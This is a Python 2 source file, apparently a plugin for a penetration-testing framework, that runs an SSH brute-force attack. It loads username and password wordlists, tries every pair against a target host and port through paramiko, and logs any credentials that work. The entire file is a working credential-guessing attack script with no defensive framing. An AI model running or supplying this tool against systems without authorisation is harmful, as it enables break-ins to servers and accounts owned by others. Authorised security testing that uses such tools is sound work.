#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import paramiko
from lib.core.data import paths, logger, th


readme = {
    "target": "Ip address",
    "port": "Port number",
    "user": "A username \033[01;33mfile\033[0m,please put \033[01;33mdata\033[0m directory.",
    "pass": "A password \033[01;33mfile\033[0m,please put \033[01;33mdata\033[0m directory."
}


def BruteForce(hostname, port, username, password):
    """Create SSH connection to target"""

    try:
        port = int(port)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname, port, username, password, pkey=None, timeout=None, allow_agent=False, look_for_keys=False)
        status = 'ok'
        ssh.close()
    except Exception, e:
        status = 'error'
        pass
    return status


def makeList(file):
    """Make usernames and passwords lists"""
    items = []
    filePath =  os.path.join(paths.DATA_PATH, file)

    try:
        f = open(filePath, 'r')
        for line in f.readlines():
            item = line.replace('\n', '').replace('\r', '')
            items.append(item)
        f.close()
    except IOError:
        logger.error("Unable to read file '%s'" % filePath)
    except Exception, e:
        logger.error("Reader '%s' file failed!" % filePath)

    return items


def run(arg):
    """Run the main function"""

    hostname = arg["target"]
    port = arg["port"]
    passlist = arg["pass"]
    userlist = arg["user"]
    usernamelist = makeList(userlist)
    passwordlist = makeList(passlist)

    logger.info("SSH Brute Force Praparing.")
    logger.info("%s user(s) loaded." % str(len(usernamelist)))
    logger.info("%s password(s) loaded." % str(len(passwordlist)))
    logger.info("Brute Force Is Starting.......")

    try:
        for username in usernamelist:
            for password in passwordlist:
                logger.info("Attempt uaername:%s , password:%s" % (username, password))
                current = BruteForce(hostname, port, username, password)
                if current == 'ok':
                    logger.success("Success!")
                    logger.success("user = %s , pass = %s " % (username, password))
                    return

        logger.warning('Done, not find!')
    except:
        logger.warning("Error! %s" % e)



